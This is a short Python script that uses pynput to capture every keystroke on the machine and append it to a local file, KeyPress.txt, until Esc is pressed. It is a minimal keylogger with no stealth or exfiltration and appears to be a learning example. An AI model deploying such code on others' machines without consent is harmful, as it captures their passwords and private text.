from pynput.keyboard import Listener, Key
def on_press(key):
    k = str(key).replace("'", "")      
    with open("KeyPress.txt", "a") as f:
        f.write(k +" ")

    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()